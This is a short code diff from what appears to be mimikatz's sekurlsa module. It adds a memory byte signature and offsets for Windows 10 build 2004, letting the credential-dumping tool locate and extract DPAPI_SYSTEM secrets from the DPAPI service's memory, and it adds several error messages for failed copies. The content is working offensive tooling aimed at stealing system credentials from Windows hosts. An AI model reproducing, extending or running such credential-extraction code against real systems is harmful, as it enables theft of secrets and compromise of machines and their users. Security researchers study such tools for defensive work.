@@ -598,6 +598,7 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 BYTE PTRN_WI52_SysCred[] = {0xb9, 0x14, 0x00, 0x00, 0x00, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
 BYTE PTRN_WI60_SysCred[] = {0x48, 0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
 BYTE PTRN_WN62_SysCred[] = {0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
+BYTE PTRN_W2004_SysCred[] = {0x8d, 0x50, 0x14, 0x8b, 0xca, 0x44, 0x8d, 0x48, 0x01, 0x44};
 KULL_M_PATCH_GENERIC SysCredReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_2K3,		{sizeof(PTRN_WI52_SysCred),		PTRN_WI52_SysCred},		{0, NULL}, { 21,  -4, 10}},
 	{KULL_M_WIN_MIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, {-13, -19,  8}},
@@ -605,6 +606,7 @@ KULL_M_PATCH_GENERIC SysCredReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_8,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-10, -19,  7}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-27, -4,   7}},
 	{KULL_M_WIN_MIN_BUILD_10,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-20, -26,  7}},
+	{KULL_M_WIN_BUILD_10_2004,		{sizeof(PTRN_W2004_SysCred),	PTRN_W2004_SysCred},	{0, NULL}, {-10, -16,  21}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WI51_SysCred[] = {0x00, 0xab, 0x33, 0xc0, 0xbf};
@@ -662,10 +664,13 @@ NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 								kull_m_string_wprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
 								kprintf(L"\n");
 							}
+							else PRINT_ERROR(L"Unable to copy (rgbSystemCredUser)\n");
 						}
+						else PRINT_ERROR(L"Unable to copy (rgbSystemCredMachine)\n");
 					}
 					else PRINT_ERROR(L"Not initialized!\n");
 				}
+				else PRINT_ERROR(L"Unable to copy (bool)\n");
 			}
 			else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
 		}
